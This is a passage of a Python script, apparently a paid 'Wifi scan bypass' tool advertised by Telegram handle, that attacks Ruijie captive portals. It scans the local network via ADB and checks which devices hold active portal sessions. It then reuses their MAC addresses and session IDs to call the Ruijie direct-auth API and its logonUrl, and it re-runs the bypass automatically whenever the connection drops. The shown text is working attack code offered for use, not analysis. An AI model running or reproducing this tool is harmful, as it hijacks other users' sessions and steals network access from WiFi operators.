            # Step 2 — hit Ruijie direct-auth API
            resp2 = session.post(
                pwn_url,
                json={"phoneNumber": "", "sessionId": s_id},
                timeout=12,
                verify=False
            )
            logon_url = resp2.json().get("result", {}).get("logonUrl", "")
            if not logon_url:
                _log(f"{YELLOW}[!] Round {attempt}: No logonUrl in API response — retrying...{RESET}")
                cached_sid = None   # don't reuse stale sid
                time.sleep(1.5)
                continue

            _log(f"{DG}[*] Round {attempt}: logonUrl → {CYAN}{logon_url[:50]}...{RESET}")

            # Step 3 — hit logonUrl (with IP fallbacks)
            if _do_logon(session, logon_url):
                return True, s_id

            _log(f"{YELLOW}[!] Round {attempt}: logon request failed — retrying...{RESET}")
            cached_sid = None
            time.sleep(2)

        except Exception as e:
            _log(f"{RED}[!] Round {attempt} error: {e}{RESET}")
            cached_sid = None
            time.sleep(1.5)

    return False, None

def monitor_connection(portal_url, mac, sid):
    fail_count   = 0
    bypass_count = 0
    print(f"\n{CYAN}[*] Monitoring Connection — Auto Re-Bypass Active...{RESET}")
    print(f"{DG}    Press Ctrl+C to stop monitoring.{RESET}\n")
    while True:
        try:
            param = '-n' if os.name == 'nt' else '-c'
            output = subprocess.check_output(
                ['ping', param, '1', '-W', '2', '8.8.8.8'],
                stderr=subprocess.DEVNULL, universal_newlines=True,
                timeout=5
            )
            m = re.search(r"time[=<](\d+\.?\d*)", output)
            if m:
                ping  = float(m.group(1))
                now   = datetime.now().strftime("%H:%M:%S")
                color = GREEN if ping < 100 else (YELLOW if ping < 300 else RED)
                rebyp = f"| Re-Bypass: {GREEN}{bypass_count}x{RESET}" if bypass_count else ""
                sys.stdout.write(
                    f"\r{DW}[{now}] Ping: {color}{ping:.0f}ms{RESET} | "
                    f"Status: {GREEN}ONLINE{RESET} {rebyp}   "
                )
                sys.stdout.flush()
                fail_count = 0
            else:
                raise Exception("no ping time")
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Monitoring stopped.{RESET}")
            break
        except:
            now = datetime.now().strftime("%H:%M:%S")
            sys.stdout.write(
                f"\r{DW}[{now}] Ping: {RED}TIMEOUT{RESET} | "
                f"Status: {YELLOW}Checking...{RESET} [{fail_count+1}/3]   "
            )
            sys.stdout.flush()
            fail_count += 1

        # Re-bypass if 3 consecutive failures
        if fail_count >= 3:
            print(f"\n{YELLOW}[!] Connection lost — Auto Re-Bypass starting...{RESET}")
            ok, new_sid = run_bypass_for_mac(portal_url, mac, cached_sid=None, verbose=False)
            if ok:
                sid         = new_sid
                fail_count  = 0
                bypass_count += 1
                print(f"{GREEN}[ ✓ ] Re-Bypass #{bypass_count} OK → Keep-alive restored{RESET}")
                time.sleep(1)
            else:
                print(f"{RED}[!] Re-Bypass failed. Retrying in 5s...{RESET}")
                time.sleep(5)
            continue

        time.sleep(2)

def _show_bypass_success(mac, sid):
    """Print the hacker-style success banner."""
    crack_steps = ["[          ]", "[##        ]", "[####      ]", "[######    ]",
                   "[########  ]", "[##########]"]
    for step in crack_steps:
        sys.stdout.write(f"\r{GREEN}Cracking... {step}{RESET}")
        sys.stdout.flush()
        time.sleep(0.18)
    print()

    w   = term_width()
    box = min(w - 2, 52)
    bdr = "═" * box
    print(f"\n{GREEN}╔{bdr}╗{RESET}")
    print(f"{GREEN}║{'':^{box}}║{RESET}")
    print(f"{GREEN}║{'██████╗ ██╗   ██╗██████╗  █████╗███████╗███████╗':^{box}}║{RESET}")
    print(f"{GREEN}║{'██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝':^{box}}║{RESET}")
    print(f"{GREEN}║{'██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗':^{box}}║{RESET}")
    print(f"{GREEN}║{'██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║':^{box}}║{RESET}")
    print(f"{GREEN}║{'██████╔╝   ██║   ██║     ██║  ██║███████║███████║':^{box}}║{RESET}")
    print(f"{GREEN}║{'╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝':^{box}}║{RESET}")
    print(f"{GREEN}║{'':^{box}}║{RESET}")
    print(f"{GREEN}║{'S U C C E S S F U L !':^{box}}║{RESET}")
    print(f"{GREEN}║{'':^{box}}║{RESET}")
    print(f"{GREEN}╠{bdr}╣{RESET}")
    print(f"{GREEN}║{RESET} {CYAN}{'TOKEN : ' + sid:<{box-1}}{GREEN}║{RESET}")
    print(f"{GREEN}║{RESET} {YELLOW}{'MAC   : ' + mac:<{box-1}}{GREEN}║{RESET}")
    print(f"{GREEN}╚{bdr}╝{RESET}")
    print()

def option_auto_bypass(expiry):
    global SELECTED_MAC, PORTAL_URL, ACTIVE_DEVICES, SELECTED_NAME
    print_header(expiry)
    print(f"\n{CYAN}[*] Auto Bypass — Option 7{RESET}")
    print(_sep())

    if not PORTAL_URL:
        print(f"\n{RED}[-] Portal URL not found!{RESET}")
        print(f"{YELLOW}[!] Please run Option 2 (MAC Scan) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter...{RESET}")
        return

    # If no MAC saved → auto-scan, active check, then bypass all active
    if not SELECTED_MAC:
        print(f"\n{YELLOW}[*] No target MAC saved — Auto scanning...{RESET}")

        # Need ADB
        if not check_adb():
            connected = adb_connect_step()
            if not connected:
                print(f"{RED}[-] ADB not connected. Cannot scan.{RESET}")
                input(f"\n{YELLOW}[!] Press Enter...{RESET}")
                return

        # Step 1: Scan
        print(f"{CYAN}[*] Scanning network...{RESET}")
        devices = scan_network_via_adb()
        if not devices:
            print(f"{RED}[-] No devices found on network.{RESET}")
            input(f"\n{YELLOW}[!] Press Enter...{RESET}")
            return
        ACTIVE_DEVICES = []
        print(f"{GREEN}[ ✓ ] {len(devices)} devices found. Checking active...{RESET}")

        # Step 2: Active check
        lock = __import__('threading').Lock()
        found = []
        total = len(devices)
        for i, dev in enumerate(devices, 1):
            print_progress_bar(i, total, f"| Checking: {dev['ip']}")
            sid = check_mac_active(PORTAL_URL, dev['mac'])
            if sid:
                dev['session_id'] = sid
                found.append(dev)
                sys.stdout.write("\r" + " " * 80 + "\r")
                print(f"{GREEN}[ Active ] {dev['ip']:<20}{YELLOW}{dev['mac']}{RESET}")
        print_progress_bar(total, total, "Done!")
        print()

        if not found:
            print(f"\n{RED}[-] No active devices found.{RESET}")
            input(f"\n{YELLOW}[!] Press Enter...{RESET}")
            return

        ACTIVE_DEVICES = found
        # Auto-select first active device
        SELECTED_MAC  = found[0]['mac']
        SELECTED_NAME = found[0].get('ip', 'Auto')
        save_mac(SELECTED_MAC, SELECTED_NAME)
        print(f"\n{GREEN}[ ✓ ] Auto-selected: {WHITE}{SELECTED_MAC}{RESET}")
        time.sleep(0.5)

    portal_short = PORTAL_URL[:60] + "..." if len(PORTAL_URL) > 63 else PORTAL_URL
    print(f"{YELLOW}[*] Portal URL : {WHITE}{portal_short}{RESET}")

    # Build ordered try-list: selected MAC first, then rest of ACTIVE_DEVICES
    try_list = []
    selected_dev = None
    for dev in ACTIVE_DEVICES:
        if dev.get('mac') == SELECTED_MAC:
            selected_dev = dev
        else:
            try_list.append(dev)
    # Put selected first
    if selected_dev:
        try_list.insert(0, selected_dev)
    else:
        # selected not in ACTIVE_DEVICES — synthesize entry
        try_list.insert(0, {'mac': SELECTED_MAC, 'ip': '?'})

    total      = len(try_list)
    success    = False
    winning_mac = None
    winning_sid = None

    for attempt_num, dev in enumerate(try_list, 1):
        mac        = dev.get('mac')
        ip_label   = dev.get('ip', '?')
        cached_sid = dev.get('session_id')

        print()
        print(f"{CYAN}[{attempt_num}/{total}] Trying MAC : {WHITE}{mac}{DG}  ({ip_label}){RESET}")
        if cached_sid:
            print(f"{DG}      Cached Session : {CYAN}{cached_sid[:24]}...{RESET}")

        ok, sid = run_bypass_for_mac(PORTAL_URL, mac, cached_sid=cached_sid, verbose=True)

        if ok:
            SELECTED_MAC = mac          # update global to winning MAC
            winning_mac  = mac
            winning_sid  = sid
            success      = True
            break

        print(f"{RED}      [-] MAC {mac} — all rounds failed.{RESET}")
        if attempt_num < total:
            print(f"{YELLOW}      [>] Trying next active MAC...{RESET}")
            time.sleep(1)

    print(_sep())

    if success:
        _show_bypass_success(winning_mac, winning_sid)
        monitor_connection(PORTAL_URL, winning_mac, winning_sid)
    else:
        print(f"\n{RED}╔══════════════════════════════════════╗{RESET}")
        print(f"{RED}║   ALL {total} MAC(s) BYPASS FAILED  ✗   ║{RESET}")
        print(f"{RED}╚══════════════════════════════════════╝{RESET}")
        print(f"{YELLOW}[!] Tips:{RESET}")
        print(f"{DG}  • Run Option 3 again to refresh active sessions{RESET}")
        print(f"{DG}  • Re-scan (Option 2) to find new devices{RESET}")
        print(f"{DG}  • Check internet — Ruijie API server must be reachable{RESET}")
        input(f"\n{YELLOW}[!] Press Enter...{RESET}")

# ==================== OPTION 8: DELETE KEY ====================
def option_delete_key(expiry):
    print_header(expiry)
    print(f"\n{CYAN}[*] Delete Current Key — Option 8{RESET}")
    print(_sep())

    if not os.path.exists(KEY_FILE):
        print(f"\n{YELLOW}[!] No key found. Nothing to delete.{RESET}")
        print()
        input(f"{DW}Press Enter to return...{RESET}")
        return

    print(f"\n{YELLOW}[!] This will delete your current license key.{RESET}")
    print(f"{RED}    You will need to enter a new key to use the tool again.{RESET}")
    print()
    confirm = input(f"  {RED}Confirm delete? (yes/no): {RESET}").strip().lower()

    if confirm == "yes":
        try:
            os.remove(KEY_FILE)
            print()
            print(f"  {GREEN}+----------------------------------+{RESET}")
            print(f"  {GREEN}|  Key Deleted Successfully!       |{RESET}")
            print(f"  {GREEN}+----------------------------------+{RESET}")
        except Exception as e:
            print(f"\n{RED}[-] Failed to delete key: {e}{RESET}")
    else:
        print(f"\n{YELLOW}[!] Cancelled. Key not deleted.{RESET}")

    print()
    time.sleep(1.5)

# ==================== MAIN ====================
def main():
    global PORTAL_URL, GATEWAY_IP, SELECTED_MAC, SELECTED_NAME

    # Start ADB server silently
    try:
        subprocess.run(["adb", "start-server"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

    # Load saved state
    saved_url = load_portal_url()
    if saved_url:
        PORTAL_URL = saved_url
    saved_gw = load_saved_gateway()
    if saved_gw:
        GATEWAY_IP = saved_gw
    saved_mac, saved_name = load_saved_mac()
    if saved_mac:
        SELECTED_MAC  = saved_mac
        SELECTED_NAME = saved_name or "Unknown"

    # Try silent ADB reconnect on same WiFi
    adb_ok   = silent_adb_connect()
    cur_gw   = get_gateway_ip() if adb_ok else None
    same_wifi = (cur_gw and saved_gw and cur_gw == saved_gw)

    # Show startup status
    expiry = load_expiry() or key_screen()
    clear()
    for line in SKYBY_ART:
        cprint(line, GREEN)
    print()
    cprint("[ Wifi scan bypass ]", YELLOW)
    cprint("Telegram -> @paingzin3521_ux", GREEN)
    print(_sep())
    print(f"{DG}[*] Device ID : {CYAN}{DEVICE_ID}{RESET}")
    print(f"{DG}[*] Expiry    : {GREEN}{fmt_expiry(expiry)}{RESET}")
    if GATEWAY_IP:
        print(f"{DG}[*] Router IP : {GREEN}{GATEWAY_IP}{RESET}")
    if adb_ok:
        print(f"{DG}[*] ADB       : {GREEN}Connected ✓{RESET}")
    else:
        print(f"{DG}[*] ADB       : {YELLOW}Not Connected (run Option 2){RESET}")
    if PORTAL_URL:
        short = PORTAL_URL[:48] + "..." if len(PORTAL_URL) > 51 else PORTAL_URL
        print(f"{DG}[*] Portal URL: {CYAN}{short}{RESET}")
    if SELECTED_MAC:
        print(f"{DG}[*] Target MAC: {YELLOW}{SELECTED_MAC}{RESET}  ({SELECTED_NAME})")

    # Ready banner
    if adb_ok and PORTAL_URL and SELECTED_MAC and same_wifi:
        print()
        print(f"{GREEN}╔══════════════════════════════════════╗{RESET}")
        print(f"{GREEN}║  ✓  READY — Same WiFi Detected       ║{RESET}")
        print(f"{GREEN}║  Press [7] to Auto Bypass directly!  ║{RESET}")
        print(f"{GREEN}╚══════════════════════════════════════╝{RESET}")
    elif PORTAL_URL and SELECTED_MAC and not adb_ok:
        print()
        print(f"{YELLOW}[!] ADB not connected — run Option 2 first{RESET}")
    elif not PORTAL_URL or not SELECTED_MAC:
        print()
        print(f"{DG}[*] First time: run Option 1 → 2 → 3 → 4 → 7{RESET}")
    print(_sep())
    input(f"{DW}  Press Enter to continue...{RESET}")

    while True:
        print_menu(expiry)
        ch = input(f"{DW}  Select Option: {RESET}").strip()
        if   ch == "0": break
        elif ch == "1": option_wifi_setup(expiry)
        elif ch == "2": option_mac_scan(expiry)
        elif ch == "3": option_active_check(expiry)
        elif ch == "4": option_select_target(expiry)
        elif ch == "5": option_aes_encrypt(expiry)
        elif ch == "6": option_encode_session(expiry)
        elif ch == "7": option_auto_bypass(expiry)
        elif ch == "8":
            option_delete_key(expiry)
            expiry = load_expiry()
            if not expiry:
                expiry = key_screen()
        else:
            time.sleep(0.5)

if __name__ == "__main__":
    main()
